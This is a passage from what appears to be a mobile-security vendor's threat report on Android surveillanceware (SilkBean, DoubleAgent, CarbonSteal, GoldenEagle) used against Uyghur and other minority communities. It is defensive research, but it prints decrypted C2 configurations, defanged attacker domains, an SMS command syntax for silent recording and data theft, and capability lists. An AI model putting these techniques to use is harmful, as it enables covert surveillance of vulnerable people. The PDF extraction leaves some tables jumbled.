to see samples into June 2019.childedu-online[.]comIndonesian/Malay, Turkish, Urdu/ Hindi, EnglishPluginPhantomturknews-online[.]comEnglish and UyghurSilkBean, DoubleAgentarabiaedu-online[.]com egyptedu-online[.]comN/AN/ATitles reference apps for live radio and TV (istiqlaltv, UYGHURTV and A2Z Kuwait FM Radio) and religious books and apps for Islam and Christianity in a number of languages including English, Arabic, Uyghur and Turkish.Masquerading as portals to a number of third party app stores, some seen previously: islamapk[.]com and yurdax[.]com.Domain names suggest possible targets in Saudi Arabia and Egypt.25 url url turkyappbaziri[.]comN/Aoztilapk[.]com uyghurappbazar[.]com datastore-ugy-dl[.]com marrip[.]orguyghur-soft-market[.]com uyghurapkbaziri[.]comN/AN/AN/AN/AN/ARegistered by who also registered turknews-online[.]com and turkyedu-online[.]com (see above).Registered by who also registered babyedu-online[.]com childedu-online[.]com highschooledu-online[.]com.Other potential infrastructure related by Passive DNS informationC2 domains linked to SilkBean and information on apps communicating with them. Many of the domains collected during our research above appear to suggest hosting content for third party app stores. For example, Oztil App Baziri appears to be yet another Uyghur-focused third party app store (www. oztil.com), and also has been seen in other HenBox and DarthPusher titles. In fact, there are so many potential app stores that, without further insight intothe targeted community, it is difficult to discern if any of these are legitimate stores or malicious watering holes impersonating legitimate stores.As shown in the table above, the titles and languages used in these applications imply targeting of these malware families over a wide geographic area. There are titles in at least ten different languages, and many samples reference services in a number of countries around the world. While many apps are of interest to Muslims in general, Uyghur populations abroad in these geographic regions have reportedly continued to see targeting by the Chinese government 27,28,29.At least eighteen third-party app stores were found during this investigation, all serving pages in Uyghur and Arabic.Among some other general and utility apps, these stores also contained apps specific to the Uyghur population or persons practicing Islam. If at least some samples of SilkBean were intended for Uyghur targets residing in China, the heavy use of third-party app stores makes sense since the Google Play store is not available in the region. Secure messaging applications such as WhatsApp and Voxer could also be downloaded from these stores, but are not malicious and appear to be popular, modified versions of those legitimate applications.www.otkaxapp.com www.turkyappbaziri.com www.izda.com app.oztil.com uyghurapkbaziri.comoztilapk.com uyghurappbazar.com datastore-ugy-dl.com www.uyghur-soft-market.com 0ztil.com uyapkbazar.comA list of all third party app stores found connected to potential C2 infrastructure for SilkBean, past and present. Some of these appear to be imitations of others, but it is difficult to confirm this for all of them since many are now offline.27 url url url depicting some of the many third-party app stores foundfocusing on persons that speak Uyghur or practice Islam.There was one group of malicious applications whose details are not described in this section. Applications that communicate to turknews-online[.]com stood out to Lookout researchers as a completely different piece of malware. These are samples from a long-running family Lookout researchers have been tracking called DoubleAgent, described next in this report. Titles and functionality were particularly noteworthy as they display content from islamapk[.]com and yurdax[.]com, previously associated with SilkBean C2 server content. The most recent samples ingested by Lookout were initially foundon VirusTotal and were uploaded through IPs located in US, Germany, and Korea in March and June of 2019.There are also malware samples communicating to the C2 server babyedu-online[.]com which belong to a surveillanceware known as GoldenEagle, described in the last section of this report.17News, the official Daesh news application. The extent of this malware family and its connections to other campaigns has not been publicly reported on until now. Lookout researchers have seen DoubleAgent used exclusively against groups with contentious relationships with the Chinese government.Although Lookout has been tracking this malware family for many years, new samples discovered in the last year indicated that the actors behind DoubleAgent were continuing to evolve the surveillanceware and use new infrastructure. However, they maintained the same targeting, as well as several key malware characteristics, such as similar decryption keys for configuration files.These recent samples, discovered in late 2019, are the focus of this section on DoubleAgent. A decryption of the configuration files from these samples revealed a direct overlap in C2 infrastructure between the operators of DoubleAgent and SilkBean at a time when both malware families appeared to be active. The C2s found also confirmed our findings that other domains resolving to the IP address 213.128.81[.]82 since February 2016 were part of the same actor\u2019s infrastructure. This leads us to believe that the same actor is behind the use of DoubleAgent and SilkBean.Titles also suggest targeting of the DoubleAgent family has included the Uyghur population, with these most recent samples masquerading as third-party Android app stores (islamapk[.]com and yurdax[.]com) serving Uyghur-focused applications and overlapping with C2 content seen when investigating SilkBean. Consistent use of domain names that fit the pattern \u201c*-online.com\u201d was also noted across both these families.It appears to be important to the threat actor using SilkBean to blend into the background noise while infecting their targets, and that is a recurring theme in their design choices. Many samples were signed with compromised signing certificates, and the campaigns involving SilkBean uses known and abundant malware (DarthPusher, Spywaller) to accomplish their tasks, perhaps so that there is no unique tooling to tie to them. Where custom tooling is used, it is blended into apps that may be downloaded by their targets, as well as making them as geographically and linguistically-specific as possible. There is also evidence that the actor has deliberately made use of titles, package names, and emails (found in WHOIS information) that mimic the names of popular Uyghur individuals and activists. For example, which was used to link may C2 domains together, may be referring to Alimjan Yimit30, a Uyghur christian clergyman who was imprisoned in 2008.Campaigns associated with SilkBean also appear to be long- running, at least since 2015, and this shows patience and perseverance by the operator in question. It also appears that this mobile tool is not only used to target the Uyghur population within China, but also around the world in countries such as Turkey, Syria, Kuwait, Indonesia, Malaysia, Afghanistan and Pakistan.DoubleAgentFindings In 2013 Citizen Lab reported on a compromised version of KakaoTalk31, which had been used to target a prominent individual in the Tibetan community. This app was the first publicly exposed sample of a malware family called DoubleAgent. When Lookout initially investigated DoubleAgent in 2015, it was already an advanced Android remote access tool (RAT). Early versions of this family trojanized apps such as Voxer and TalkBox, as well as Amaq30 url url detailsEach DoubleAgent sample comes with an encrypted file in the assets folder that contains configuration information for the malware and its command and control servers. On launch, the malware Base64 decodes the file, most recently disguised with the name \u201cGoogleMusic.png\u201d. This decoded text is then decrypted with a key formed by joining two strings hardcoded in the sample. MessageDigest is used to calculate the MD5 of this string, which is then used as the final key when decrypting the configuration file using the AES algorithm.Contents of the decrypted configuration file are split by a sequence of hash signs (\u201c###\u201d or \u201c####\u201d) and then dollar signs (\u201c$$$$$\u201d). This allows the malware to parse out C2 information, decryption/encryption keys, beaconing and timeout periods, among other configuration details on how the malware is run on an infected device androidapps.spdns.org:990 $$$$$comix_Qove $$$$$HaPyzi0o825-$^ $$$$$1 ####android.apps.us.to:990 $$$$$comix_Qove $$$$$HaPyzi0o825-$^ $$$$$1 ####androidapps.nsupdate.info:990 $$$$$holder-Peoq $$$$$PhyOZ915_#@ $$$$$1 ####android.app.info.tm:990 $$$$$holder-Peoq $$$$$PhyOZ915_#@ $$$$$1 ####url ####30 ####600 ####21600 ####60 ####onDecrypted contents of early configuration files called \u201cgoogle.ind\u201d.[{\u201cIP\u201d:\u201dwww.turknews-online.com\u201d,\u201dport\u201d:9701},{\u201cIP\u201d:\u201dwww.cookedu-online.com\u201d,\u201dport\u201d:9701},{\u201cIP\u201d:\u201dwww.turknews- areas for exfiltrated content and required infected devices to authenticate with credentials from the decrypted text file. In addition to serving as a staging area for exfiltrated information, the FTP servers also hold files containing specific instructions that a device should carry out in the future. When an infected device beacons to C2 infrastructure it will check the FTP server for files with the format <device IMEI>. fmd. These files contain commands for a discrete action like uploading a file, enabling a service such as audio recording, searching directories for specific files, or installing additional applications.Newer versions of DoubleAgent upload files, unencrypted, directly to the C2 servers using TCP sockets. Although the usual list of surveillance data is pulled and inserted into SQLite databases on the device (such as system information, calls, contacts, SMS texts, apps installed, browsing history, and more), it is not uploaded unless instructed by the C2 which indicates that the actor behind DoubleAgent prefers handling data exfiltration carefully, likely to avoid detection.19In addition, DoubleAgent also pulls the list of files, where possible, from the following set of locations when instructed to do so via C2 commands. It also monitors any changes and logs them in a SQLite database locally on the device.\u2022 /data/data/com.google.android.gm/shared_prefs(Gmail app)\u2022 /data/data/com.google.android.gm/databases(Gmail app)\u2022 /data/data/com.android.email/shared_prefs(Default email app)\u2022 /data/data/com.android.email/databases(Default email app)The most noteworthy RAT capabilities found to be present in these new samples are discussed below:\u2022 Runs arbitrary shell commands with or without rootprivileges, as specified by the C2 and returns the output of the command.\u2022 Remounts system as Read-Write, installs a file as a systemapp at the location /system/app/GoogleMail.apk, and remounts /system back to Read-Only permissions if it has root.\u2022Installs a specified APK after a specified number of seconds.\u2022 Hides or unhides app icon.\u2022 /data/data/com.dropbox.android/databases\u2022 Updates C2 configuration.(Dropbox app)\u2022 /data/system\u2022 /DCIM\u2022 /PicturesSome samples of DoubleAgent feature code for downloading exploits in order to root the phone and install additional malware as a system app. Specifically, Lookout has seen the authors using TowelRoot in order to gain privileged access on victim devices and install additional malware on /system. This technique makes it difficult for the typical user to clean their device if infected.Messages received from the C2 can contain an object that specifies two things: a number representing one of up to 39 commands handled by the malware, and optionally a String object that specifies any further parameters, each separated by a sequence of hash signs (\u2018#\u2019).\u2022 Gathers a list of running apps and a list of apps in theforeground.\u2022 Creates, deletes, and renames specific files.\u2022 Records calls as .amr files, and zips them before sendingthe archive file out to the C2 server.\u2022 Has the ability to kill its background service if needed,likely either to avoid detection or save battery.\u2022 Stores all exfiltrated data in database (.db) files on thedevice.\u2022 Has a database to track what files need to be uploadedto or downloaded from the C2 server, as specified by commands provided to the malware.\u2022 Can either automatically or when directed by the C2 copy and upload data of popular communications applications, depending on the DoubleAgent sample.20TalkboxDiDi (rideshare app in China)KeechatCocoVoxerWhatsAppAiretalkViberTelegramSkypeQQMicroMsgMagicCall (Voice Changer app)Zello (Push to talk)BBMList of applications whose files or databases are uploaded to DoubleAgent C2 servers of DoubleAgent samples seen in 2019. The malware also attempts to change the file permissions for all files under the /data/data/ directory of the above chat applications to permit read/write/execute for any UID.Instruction (command) 38, above, allows the attacker to execute a specified shell command along with an arbitrary number of parameters separated by a \u2018###\u2019 string, without requesting root permissions. \u2018Kshell\u2019 is the class in DoubleAgentresponsible for executing shell commands with or without root permissions, as specified. If the command successfully getsexecuted, the output is sent back to the C2.21DoubleAgent\u2019s connection to other malware familiesIn late 2019 novel DoubleAgent samples appeared that had evolved significantly from previous versions, and a closer look at their configuration and C2 infrastructure highlighted new connections to SilkBean, HenBox and DarthPusher. This strengthened the theory that the actor behind DoubleAgent is also involved in the deployment, and perhaps even development, of these other malware families.Icons of the newly uncovered DoubleAgent samples, which aretitled \u201cDisk photo recovery\u201d, \u201cSafeUM\u201d, \u201cQuran\u201d and \u201cAlphabet\u201d,the last two being in line with past targeting profiles.Many of the new DoubleAgent samples in Lookout\u2019s app database contained configuration files, which, when decrypted, contained links to known SilkBean C2 infrastructure.[{},{},{},{\u201cIP\u201d:\u201dwww.turknews-online.com\u201d, \u201cport\u201d:9701\u201cIP\u201d:\u201dwww.cookedu-online.com\u201d, \u201cport\u201d:9701\u201cIP\u201d:\u201dwww.turknews-online.com\u201d, \u201cport\u201d:9080}] ####600####60####on[{},{},{},{\u201cIP\u201d:\u201dwww.turknews-online.com\u201d, \u201cport\u201d:9701\u201cIP\u201d:\u201dwww.turknews-online.com\u201d, \u201cport\u201d:9701}] ####600####60####offTwo configurations found in recent DoubleAgent samples.The hardcoded IP address present in one ofthe DoubleAgent configurations is pointed to by two domains of interest: classone- online[.]com and classedu-online[.]com. Asshown in the previous section on SilkBean, the naming pattern \u201c*edu-online[.]com\u201d and \u201c*-online[.]com\u201d is consistent with the actorbehind SilkBean as well as activity linked withthe same actor also employing HenBox andPhantomPlugin malware families.22Four non-compromised signing certificates that signed samples of DoubleAgent were also used to sign applications belonging to the HenBox, DarthPusher and CarbonSteal Android surveillance families. CarbonSteal is another novel malware family described in the next section of this report. This confirms the theory that the actor behind the deployment and use of the samples of these malware families is the same. An overlap in validity dates of these signing certificates may also indicate that these tools were under development and use in the same timeframe, starting in early 2015.Finally, code similarities in these samples of SilkBean, HenBox, DarthPusher, CarbonSteal and DoubleAgent also suggest a common origin. For example, a malware sample first seen in late 2016 has unique code characteristics that belong to both HenBox and CarbonSteal, while being signed with a certificate that has also been used to sign DoubleAgent samples. Another sample (SHA-1: \u201cQuran\u201d, possesses code similarities between HenBox and DoubleAgent malware families, while also being signed with a certificate that was used to sign 48 other HenBox, DoubleAgent, DarthPusher and CarbonSteal samples. This is another indicator that these malware tools are being used in tandem by the same actor.CarbonStealFindings In March 2018, Palo Alto Networks released a report on a Chinese surveillanceware family named Henbox32, which was found to be targeting minorities in China. When examining this research closely, Lookout found numerous IoCs (such as C2 and signer certificates) overlapping with another long running surveillanceware family, CarbonSteal, so named dueto signer certificates containing the phrase Y\u01d0ti\u0101n ji\u00e0n, thatmay be referring to a sword frequently advertised for sale as made from carbon steel.CarbonSteal is Android surveillanceware that has been tracked by Lookout since 2017, and more than 500 samples have been seen to date. While not as sophisticated as HenBox, certain samples of CarbonSteal do make use of a combination of native libraries and DEX classes, while others do not and are much simpler.Hallmarks of CarbonSteal include extensive audio recording functionality in a variety of codecs and audio formats, as well as the capability in later samples to control an infected device through specially crafted SMS messages. Attackers can also perform audio surveillance through the malware\u2019s ability to silently answer a call from a specific phone number and allow the attacker to listen in to sounds around an infected device. Based on this functionality, we suspect that CarbonSteal might be deployed in areas with insufficient or no mobile data coverage.Samples of CarbonSteal and HenBox also use the same non- compromised signing certificates in many cases, suggesting the actor behind their deployment is the same. Furthermore, overlapping validity dates of these certificates may indicate that the samples were produced around the same time frame. This evidence led Lookout researchers to the theory that these tools were primarily used in an ongoing malware campaign (at the time) and against similar targets, with titles and languages once again suggesting a Uyghur focused interest.Other overlaps in C2 and signer certificate IoCs indicate that tools such as DarthPusher and PhantomPlugin are also in this actor\u2019s mobile surveillance arsenal.Lastly, a C2 IP address that communicated with CarbonSteal and HenBox samples was also observed communicating with samples of an OS X backdoor that was tied to GREF activity in 2014 by FireEye33.32 url url detailsTitles for the vast majority of CarbonSteal samples are \u201c\u201d, which translates to \u201cSetting\u201d, however the operators behind this familyalso used various Google themed names and app icons for well known chat apps, VPN apps and popular games in China. They alsoimpersonated Baidu apps (such as iQIYI, an online video platform based in Beijing and used by the Chinese Taiwan Affairs Office to further United Front (China) efforts)34 and Izda, a Uyghur-focused search engine and content site. Titles such as \u201cQuran\u201d, \u201cDua\u201d and \u201cmullaim\u201d also point to a Muslim focus of targets.CarbonSteal samples exhibit a high level of sophistication, with recent samples splitting their malicious functionality between native libraries and secondary APKs that get decrypted and loaded during execution, at times using reflection. Early samples appear to be based on the Dendroid malware family. Throughout its implementation, CarbonSteal maintains a focus on audio recording functionality and collection of data from chat applications popular in China.CarbonSteal samples contain an RC4 encrypted configuration file (usually config.txt or conf.txt) where information such as command and control details (IP/domain and port), a control phone number, and a UID are stored. Almost all samples also contain encrypted secondary JAR or DEX files in the assets folder, titled googlej.jpg and googles.jpg.\u2022 Retrieve device metadata including model, manufacturer,product, sdcard size, and memory specs.\u2022 Retrieve disk usage information.\u2022 Retrieve CPU information including device serial number.\u2022 Retrieve QQ content from external storage.\u2022 Retrieve installed apps and when they were installed.\u2022 Retrieve notes and data from MiCode35, a community-run,open source version of the Xiaomi sticky note app, and even masquerades as this application.\u2022 Receive out-of-band instructions via SMS from numbersspecified in the configuration or retrieved from the C2.On compromised devices, CarbonSteal samples have the following functionality:\u2022 Track the location of a device.\u2022 Remotely record audio.\u2022 Retrieve call logs.\u2022 Search external storage for various files such as audio\u2022 Retrieve all SMS and MMS messages.recordings (.amr).34 url url\u2022 Call netcfg and get stats.\u2022 Log when the device is powered on and off.\u2022 Dynamically load additional functionality.\u2022If the superuser binary is present, use it to silently install additional applications\u2022 Test for the Flyme operating systems or OPPO or VIVOphones in order to turn off various power saving features.CarbonSteal\u2019s capability for operation without the use of mobile data or WiFi is particularly interesting. Apps of this family monitor the sender of incoming text messages and caller ID of incoming calls and match it against a number specified in the configuration file. If a call is received from the control phone number, the malware turns off the device\u2019s ringer and answers the call immediately. This allows the operator of the control phone to listen in on the environment around the infected device. Once the call ends, the call log is deleted from call records on the device.CarbonSteal operators can also remotely control infected devices by sending them specially crafted text messages. The instruction set available via SMS in recent samples includes the following commands:Text message from control phoneFunction@*a<digits>@*b<digits>@*c<digits>@*d[1|*][*|null]Retrieves the contact details associated with the number specified by <digits>Retrieves the call log details at a particular offset from the start of the call log list, specified by <digits>. Call log list is sorted with the most recent call first.Retrieves the SMS details at a particular offset from the start of the SMS list, specified by <digits>. SMS list is sorted with the most recent SMS first.Responsible for silently starting or stopping environment recording. To start recording the sequence @*d needs to be followed by 1. To stop recording an adversary needs to supply any other value in place of the 1.If the text contains any other data, including if it is empty, this will trigger CarbonSteal samples to get current cell information about the device including the 16-bit GSM Cell Identity, 16-bit Location Area Code as well as the the mobile country code (MCC) and mobile network code (MNC) of the mobile network operator.Table showing the format of control SMS messages received and function performed by CarbonSteal as a result. The retrieved data is sent back to thecontrol phone number using SMS messages. CarbonSteal expects the control phone number to start with +86, which is the dialing code for China.Analysis of sample configurations only found one control phone number (158 7172 6845) specified for a small set of samples, which may belong to amobile number segment operated by China Mobile in Wuhan City, Hubei Province.CarbonSteal samples are able to encode audio data into a variety of encodings, such as G711, G722 and Speex and store audio files in a variety of file formats, such as .amr, .raw, .wav and .gms3. CarbonSteal can send this audio data as complete recorded files through network sockets or by using RTP to stream data to a C2.25Audio and other data is stored at the following locations using timestamps as file names:\u2022\u2022\u2022\u2022\u2022\u2022/mnt/sdcard/google/db/mp/<timestamp> (general media recorder)/mnt/sdcard/google/db/mc/<timestamp> (general media recorder)/mnt/sdcard/google/db/pr/<timestamp> (phone call recorder)/mnt/sdcard/google/db/sr/<timestamp> (SMS-triggered audio recorder)/mnt/sdcard/google/db/ps/<timestamp> (screenshot capture)/mnt/sdcard/google/db1/<timestamp> (seen in older samples, no use of subfolders)Audio data can also be recorded to the following paths on external storage:\u2022/<sdcard>/FinalAudio.amr\u2022/<sdcard>/RawAudio.raw\u2022/<sdcard>/FinalAudio.wavCarbonSteal attempts to perform rudimentary SSL certificate validation by using the HostnameVerifier36 interface to confirm that the hostname of the C2 server communicating back to the malware is indeed the same one in the SSL certificate the SSL connection is using.CarbonSteal appears to have been the most active in 2017, when the vast majority of new samples were seen. However, later samples of CarbonSteal seen in 2019 moved towards making extensive use of Android accessibility services to exfiltrate messages from secure messaging applications, a trend commonly seen in other recent Android surveillance malware. This suggests that CarbonSteal is still under active development and continues to evolve.CarbonSteal C2 infrastructure and APT15 linksDuring the investigation of CarbonSteal, the C2 domain amote-366.vicp[.]cc was found to be hosting numerous websites on a number of subdomains some of which contained content restricted in China. Site content included a GoogleDrive link to the book \u201cFreedom in the Sunset\u201d written by Professor Yuan Hongbing, which has been banned by Chinese authorities. Other content included Uyghur-themed political content and content that appears to be Iranian specific.Legitimate applications were also found hosted on the same site, such as versions of Baidu Netdisk for MacOSX, Android, iOS and Windows.36 url of some of the hosted content on CarbonSteal\u2019s C2 domain amote-366.vicp[.]cc.There could be a number of reasons a C2 server may be hosting this content. It is possible that the site originally hosted this content deliberately and was then compromised by the actor behind CarbonSteal. The alternative is that the actor may have used the same server with a secondary purpose of luring individuals who are inclined to access this content. In either case, this setup allows the actor to monitor access to this content and possibly target those that do.Non-compromised signer certificates used to sign CarbonSteal samples were also used to sign a subset of malware samples belonging to the families known as Henbox and DarthPusher. This consistent use of the same mobilesurveillanceware families was also seen when examining SilkBean and DoubleAgent samples. This may suggest that actors behind the use of these malware families not only share the same target groups but also resources and tools.In March 2018, Lookout researchers discovered that certain CarbonSteal C2 domains overlapped with several HenBox samples found at the same time. A handful of these CarbonSteal samples were also found to communicate to a particular IP address (61.128.110[.]38) that overlapped with the deployment of an OSX backdoor XSLCmd reported by FireEye37 in 2014.37 url article initially described the activity as belonging to the threat actor GREF, but it was updated in August 2019 to note that the activity is now being tracked as an uncategorized APT group. In past public reporting the actor known as GREF is also referred to as APT15, Ke3chang, Mirage, Vixen Panda andPlayful Dragon. GREF is so named due to a variety of Google references in their activities, and the same can be seen in the activity of the threat actor behind CarbonSteal. This includes application titles, package names and encrypted files\u2019 names.IoC overlap from 2018 between CarbonSteal, HenBox, and an IP address tied to APT backdoor use in 2014.In July 2019, ESET published findings on a previously undocumented backdoor named Okrum, used to deliver Ketrican malware38 and attributed to the Ke3chang group. According to this report, several Ketrican samples from 2017 communicated to subdomains of babytoy-online[.]com.Ketrican SHA-1C2 serverD3BFB10DB08C6828C3001C1F825ED6A6BF6F6E01buy.babytoy-online[.]com2C8B145EF5AC177C99DFCB8C0221E30B3A363A96newflow.babytoy-online[.]comD8AA9E4918E464D00BA95A3E28B8707A148EC4D7buy.babytoy-online[.]comF2BFDA51BDA3EE57878475817AF6E5F24FFBBB28items.babytoy-online[.]com38 url not a concrete connection, this is reminiscent of the naming pattern seen in many past domains associated with Henbox, SilkBean and PluginPhantom infrastructure.Other domains seen associated with HenBox, SilkBean and PluginPhantom, families monitoring Chinese minorities.Given the overlaps of C2 infrastructure, it appears plausible that these three families have the same developer and targets. This belief, in conjunction with past public reporting39 that HenBox is also tied to APT15, leads Lookout researchers to believe that SilkBean, PluginPhantom, and now CarbonSteal, can be tied to this mAPT threat.GoldenEagleFindingsThe last family in this discussion is GoldenEagle, which Lookout researchers also believe is being used by the same group of China-based actors described in this report.GoldenEagle, so called due to titles (\u201cGolden.eagle\u201d) and package names (\u201ccom.golden.eagle\u201d) of samples believed to be test / development versions, targets primarily Uyghurs and Muslims in general, as well as Tibetans, individuals in Turkey, and in China. Golden eagles are used as part of ancient hunting traditions40 throughout the Eurasian Steppe and diasporas in Mongolia and the Xinjiang Autonomous Region whose population is primarily Uyghur.Among the aspects that make GoldenEagle particularly interesting is that the earliest test samples of this family appeared as early as 2012, making it one of the longest- running surveillanceware families we have observed to date. GoldenEagle code has been identified in an impressively39 url versary-playbook-long-standing-espionage-activity-chinese-nation-state-adversary/40 url and diverse set of applications over the years. These samples can be divided into two major groups: those that exfiltrate data via HTTP and those that exfiltrate data via SMTP, i.e., by sending exfiltrated data in file attachments of emails to an attacker-controlled mailbox using innocuous-looking subjects and mail body content. The latter technique, while appearing in the early stages of GoldenEagle development, has resurfaced in samples signed and analysed in May 2020.Insecure configurations in attacker infrastructure have also shown that the actor behind GoldenEagle is not only targeting Android devices, but also conducting phishing attacks in parallel from the same administration console. The actors behind GoldenEagle have shown themselves to be well resourced and capable of operating a long-running campaign.Mapping out when apps trojanized with GoldenEagle were signed shows the actors\u2019 activity. A clear spike in samples belonging to this familytook place during 2016, and new samples have continued to be observed in 2020. At this point it is unclear whether these new samples arepart of testing or a re-emergence of GoldenEagle activity, as these newer samples appear to be largely unchanged and possess the test title\u201cGolden.eagle\u201d.30The majority of samples of GoldenEagle were clearly developed with targeting of the Uyghur minority in mind and included trojanized versions of apps such as Sarkuy (Uyghur music service), Tawarim (Uyghur e-commerce site), uyhurqa kirgvzvx (Uyghur input keyboard), Yeltapan Air (possibly an airline booking application - Yeltapan Inc. is a popular Uyghur app development company), TIBBIYJAWHAR (Uyghur Pharmaceutical app), Hawar.cn News (believed to previously provide Uyghur-specific news and content), Nur.cn News (also delivers Uyghur-specific content) and the Uyghur Quran, among others.Other samples included trojanized apps with a broad range of functionality from VPNs, instant messaging, and socialnetworking to games, adult media content, and Google searching. Notable trojanized apps include Twitter, Facebook, Calendar, AIM, RenRen, VLC media player, and the QQ messaging application.The expanse of applications trojanized by GoldenEagle alsoindicated additional targets, with applications titled \u201c\u201d (Quick Search Tibet), \u201c\u201d (Travel Notes in Tibet) and \u201c\u201d (Beautiful Tibet Featured Wallpaper) thatappeared to focus on individuals living or travelling in Tibet. \u201cGundem News\u201d was also seen in the array of titles suggestingindividuals in Turkey are also targeted. \u201c8684\u201d, the Beijingbus transit application, was also seen as an app title, possibly indicating broader Chinese targeting.The actors behind GoldenEagle have deployed trojanized versions of a staggeringly large and diverse set of applications. This level of technicalinvestment combined with the longevity of operations suggests that GoldenEagle is being managed by a well-resourced adversary. Shownabove is a subset of app icons from the GoldenEagle family.31Malware detailsGoldenEagle samples can be divided into two disparate groups; samples that communicate to attackers through HTTP requests and samples that communicate via SMTP to a hardcoded email address that is assumed to be operated by the attacker.Early samples of GoldenEagle exfiltrated data through files sent over SMTP to an attacker-controlled email address. All samples had the same hardcoded attacker email -. On start up these samples also sent an SMS message to an attacker-controlled number(18801206738, a Beijing mobile number) with the message \u201c A host online, attention please!\u201d.Use of this version appears to have ended in 2017 and has only recently picked up again in May 2020 with samples labelled with the default name \u201cGolden.eagle\u201d. The email address and phone number remains consistent. This makes it unclear whether this is testing by the actor or another wave of activity.Data exfiltrated by these samples is limited to lightweight text files and includes the following content:Data typeFile attachment 00Subject/body of emailContent of text fileCall LogsC.txtSubject: Hello,George Body: Forum Nokia DeveloperSMSSX.txtSubject: HELOS Body: MyBody<missed calls list> !-*RMC*-! <Incoming calls list> !-*RIC*-! <Outgoing calls list><Inbox list> <Sentbox list>ContactsP.txtSubject: Hi,Peter Body: Launches N900-Newest mobile<contact list>Early versions of Golden Eagle exfiltrate data as an attachment to an email with subject, body, and attachment file name specific to the type of data beingexfiltrated. Incomplete functionality for MMS message exfiltration as well as receiving emails from the attacker for command and control operations wasalso seen in later samples.The following credentials were used in all samples of the SMTP version of GoldenEagle:Smtp = \u201csmtp.sina.cn\u201dUser = \u201cPassword = [redacted]From = \u201c\u201d\u201dThe second version of GoldenEagle vastly expands the malware\u2019s capability and makes use of HTTP POST requests as its primary communication method with C2 infrastructure. These samples contain plaintext configuration files stored in the assets directory of each application from where C2 information can be gathered.32There are two versions of these configuration files that accompany slightly different functionality as well. The earlier version is labelled \u201cgoledn_config.json\u201d that has only one configuration setting beyond attacker C2 details, which registers if the malware has been run for the first time or not. In samples making use of the second, more advanced version of the configuration file (named \u201cygoledn_config.json\u201d) the configuration contains up to 15 different parameters and the malware includes functionality to update these parameters through C2 instructions, allowing an attacker to enable and disable various malicious functionality.These more recent GoldenEagle samples come with the surveillanceware capabilities listed below.\u2022 Get contact information.\u2022 Retrieve installed apps.\u2022 Retrieve call history.\u2022 Notify operator if it has root permissions.\u2022 Retrieve any doc, txt, gif, apk, jpg, png, mp3, and db filesthat are found on external storage.\u2022 Retrieve text messages.\u2022 Take screenshots.\u2022 Take photos with the device camera.\u2022 Request device administrator privileges.\u2022 Allow proxy configuration.\u2022 Record calls in .amr format.\u2022 Record environment audio when instructed by theoperator.\u2022 Location tracking.\u2022 Get messages from chat applications such as WeChat.\u2022 Send notifications to specific SMS endpoints.\u2022 Update themselves.41 url messages are sent by GoldenEagle when a second stage is successfully installed, or when a SMS message containing a Telegram code is received.GoldenEagle and CarbonSteal convergenceLookout researchers discovered several code overlaps between CarbonSteal and GoldenEagle, suggesting that the malware families are developed by the same actor.During our investigation, we noticed a unique WeChat ID (wx09fa07f77f651c23) in several CarbonSteal samples that was also found in one GoldenEagle sample. This ID is also used in an application (SHA-1: signed using the same signing certificate also used to sign known CarbonSteal samples. However, this particular sample appears to be an app dropper rather than a full-featured surveillanceware though it is also capable of tracking device location. The title and legitimate functionality of the app is called \u201cizda\u201d and it connects to a Uyghur content site of the same name41. Lookout researchers were not able to retrieve a malicious second stage from the app.Code functionality not directly tied to malicious activity within the above-mentioned app dropper application was found to overlap with a number of other GoldenEagle samples all targeting Uyghur and Uzbek speaking individuals or groups. Their titles included, izda (Uyghur content site), Papap (a Chinese language vehicle information app associated with Autonavi), Baykuq (a Uyghur language news app), Misranim (a popular Uyghur language website), TIBBIYJAWHAR (Uyghur Pharmaceutical app), and Isimlar (an Uzbek child naming site, with a package name of com.yeltapan.isimlar).33Application icons of malware samples that share overlapping code found in CarbonSteal and GoldenEagle.All these titles are in line with past GoldenEagle and CarbonSteal targeting efforts, indicating that the two malware families have significant overlap in use. These new samples, in particular those with app dropper functionality may suggest the further evolution of this tooling and the continued activity of the actor behind these threats.C2 infrastructure and connections with other malwareDuring this investigation we mapped out a sprawling infrastructure used by the actor behind GoldenEagle which resulted in over 50 domains and IP addresses being tied to this adversary. There was a consistent pattern of registeringand using fake domains intended to fool users into believing that the domain names were associated with popular services such as Google, Norton, Symantec, and Voxer.At the time of writing this report, all known C2 infrastructure supporting GoldenEagle is no longer active. However, during the investigation in 2017-2018 we identified several domains which were found to contain security flaws, allowing for a deeper insight into adversary behavior, targeting and attribution. Among the content accessible was a management panel that contained email addresses of targets, what we believe to be GPS coordinates of target devices, IPs of admin logins and target devices, and evidence that phishing campaigns were being run from the same infrastructure.During the investigation in 2017 and 2018, Lookout researchers were able to retrieve the IP addresses for logins to the administrator panel sincemid August of 2017. This included over 100 addresses.34Target upload logs as seen on an open GoldenEagle administration panel showing some of the earliest uploads from infected devices in 2017.The logs shown in this figure are most likely test devices.Mapping out GPS coordinates listed in the management panel shows a close clustering centering around Tang chang\u2019an Wall Site Park. One ofthese is located in an area labelled Xi\u2019an Tianhe Defense Technology, which is a large defense contractor in China.35Screenshot showing one of the open GoldenEagle management panels where attacker-specified phishing links for Voxer, Facebook, VK, andKik are listed. The translated table column titles from left to right are: \u201cNumber\u201d, \u201cType\u201d, \u201cPhishing URL\u201d, \u201cDate\u201d, \u201cAction\u201d. The button in the top left is labelled \u201cAdd Phishing URL\u201d. ace.v0xer[.]net was seen live as late as August 2018 and resolved to an IP address to which a GoldenEagle C2 server (www.vipapkdownload[.]com) also resolved until September 2019, suggesting GoldenEagle was used in multi-year campaigns and mayhave leveraged phishing attacks at the same time.A small number of GoldenEagle samples were also found to communicate to a C2 server known to be associated with DoubleAgent activity and tied to SilkBean infrastructure mentioned previously in this report (babyedu-online[.] com). Titles of these applications appear in English, Uyghur, Chinese, Arabic and Uzbek. One title \u201cAbdulweli Qari\u201d may refer to the prominent Uyghur Muslim cleric Abdukerim Abduweli, also known as, Kerem Qari, who was imprisoned in northwest Xinjiang42.This follows the consistent pattern we have observed in IoCs within the four malware families discussed here of leveraging the names of prominent figures in the Uyghur community as email addresses in WHOIS information, and titles and content of malware samples, intended to entice individuals who are engaging in these topics.A handful of GoldenEagle samples also share a C2 IP address (203.124.14[.]109) with known samples of Spywaller43 and titles of those samples were Uyghur targeted, yet another addition to the actor\u2019s Android surveillance arsenal.42 url url Lookout Lookout is the leader in mobile security, protecting the device at the intersection of the personal you and the professional you. Our mission is to secure and empower our digital future in a privacy-focused world where mobile devices are essential to all we do for work and play.The broad adoption of smartphones and tablets have created new and endless ways for cybercriminals to convince you to willingly use your mobile device for their unlawful gain. The most common start of a cyberattack is a phishing link and 